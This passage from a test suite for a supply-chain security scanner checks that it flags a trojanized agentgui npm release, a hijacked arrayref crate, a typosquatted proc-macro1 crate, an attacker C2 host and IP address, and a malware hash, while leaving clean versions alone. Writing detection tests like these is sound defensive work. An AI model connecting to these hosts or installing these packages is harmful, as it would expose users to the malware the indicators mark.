        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN" || f.rule === "IOC_KNOWN_DEAD_DROP"
      );
      expect(finding).toBeUndefined();
    });

    it("pins only the trojanized agentgui release and leaves the clean ones alone", () => {
      const feed = getBundledFeed();

      expect(
        matchBareNpmIOC("agentgui", "1.0.1127", feed),
        "agentgui@1.0.1127 must resolve as an npm IOC",
      ).toBeTruthy();

      // agentgui has 1,110 published versions and a real purpose. If any of these
      // resolve, the pin has silently widened into a name-level block on a package
      // whose publisher was the victim of the compromise.
      for (const version of ["1.0.1120", "1.0.1125", "1.0.1126"]) {
        expect(
          matchBareNpmIOC("agentgui", version, feed),
          `agentgui@${version} predates the trojanized publish`,
        ).toBeNull();
      }
    });

    it("blocks the two fully-malicious names by name", () => {
      const feed = getBundledFeed();

      // matchBareNpmIOC, not matchPackageIOC: a bare feed value means the npm
      // namespace, and matchPackageIOC only resolves explicitly prefixed values.
      // Asserting through the npm matcher is what proves these two landed in the
      // npm namespace rather than somewhere a scanner never reaches.
      for (const name of ["scrollbar-hide-plugin", "tailwind-animation-founder"]) {
        expect(
          matchBareNpmIOC(name, "1.0.0", feed),
          `${name} must resolve as an npm IOC at any version`,
        ).toBeTruthy();
      }
    });
  });

  // =================================================================
  // arrayref / proc-macro1 crates.io build-time dropper (August 2026)
  // =================================================================

  describe("arrayref Build-Time Dropper (crates.io, August 2026)", () => {
    it("flags the hijacked arrayref 0.3.10 in a Cargo.lock through a real scan", async () => {
      fs.writeFileSync(
        path.join(tempDir, "Cargo.lock"),
        [
          "# This file is automatically @generated by Cargo.",
          "version = 3",
          "",
          "[[package]]",
          'name = "arrayref"',
          'version = "0.3.10"',
        ].join("\n"),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "CARGO_MALICIOUS_CRATE");
      expect(finding, "the poisoned arrayref release must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // The version pin is the whole point: arrayref is a legitimate crate with 245M
    // downloads, and only the single 0.3.10 release was poisoned. Flagging any other
    // version would make the scanner unusable for every honest Rust project.
    it("does NOT flag the clean arrayref 0.3.9 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "Cargo.lock"),
        [
          "version = 3",
          "",
          "[[package]]",
          'name = "arrayref"',
          'version = "0.3.9"',
        ].join("\n"),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /arrayref/.test(JSON.stringify(f)));
      expect(finding, "only 0.3.10 was poisoned - 0.3.9 must stay clean").toBeUndefined();
    });

    it("flags the proc-macro1 dropper crate at any version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "Cargo.lock"),
        [
          "version = 3",
          "",
          "[[package]]",
          'name = "proc-macro1"',
          'version = "1.0.106"',
        ].join("\n"),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "CARGO_MALICIOUS_CRATE");
      expect(finding, "the typosquatted dropper must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // proc-macro2 is David Tolnay's real crate, the one proc-macro1 typosquats.
    it("does NOT flag the legitimate proc-macro2 crate", async () => {
      fs.writeFileSync(
        path.join(tempDir, "Cargo.lock"),
        [
          "version = 3",
          "",
          "[[package]]",
          'name = "proc-macro2"',
          'version = "1.0.86"',
        ].join("\n"),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /proc-macro2/.test(JSON.stringify(f)));
      expect(finding, "the real proc-macro2 must never be flagged").toBeUndefined();
    });

    it("flags the stage-2 payload host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "build.js"),
        'const host = "hwsrv-798836.hostwindsdns.com";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the attacker VPS host must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // Hostwinds is a legitimate hosting provider and its DNS apex appears in
    // ordinary infrastructure code. Only the attacker's specific host is an IOC.
    it("does NOT flag the shared hostwindsdns apex on its own", async () => {
      fs.writeFileSync(
        path.join(tempDir, "infra.js"),
        'const provider = "hostwindsdns.com";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the shared provider apex must never be flagged").toBeUndefined();
    });

    it("flags the stage-2 C2 address", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const c2 = "23.254.165.112:9089";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP");
      expect(finding, "the payload host must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the poisoned .crate artifact hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "manifest.js"),
        'const sha = "25ad700976873c76af785cb99b33c48db7df8b81f21d1e9e06b3676b9a9373ae";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the arrayref artifact digest must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

});
